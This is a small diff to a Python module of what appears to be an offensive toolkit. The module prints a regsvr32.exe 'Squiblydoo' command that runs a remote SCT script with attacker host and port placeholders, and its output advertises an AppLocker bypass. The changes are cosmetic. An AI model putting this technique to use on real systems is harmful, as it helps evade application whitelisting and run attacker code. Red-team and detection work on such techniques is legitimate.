@@ -1,5 +1,4 @@
-"""regsvr32.exe LOLBin — SCT script execution, AppLocker bypass."""
-from __future__ import annotations
+"""regsvr32.exe LOLBin  -  SCT script execution, AppLocker bypass."""
 import sys
 from typing import Any
 
@@ -45,7 +44,7 @@ def run(args: Any) -> int:
         lhost=lhost or "<LHOST>", lport=lport)
 
     print("[*] regsvr32.exe LOLBin (Squiblydoo):")
-    print("  {}".format(cmd))
+    print(f"  {cmd}")
     print("\n[*] Use --generate-sct to create the SCT payload")
     print("[*] This bypasses AppLocker default rules")
     return 0
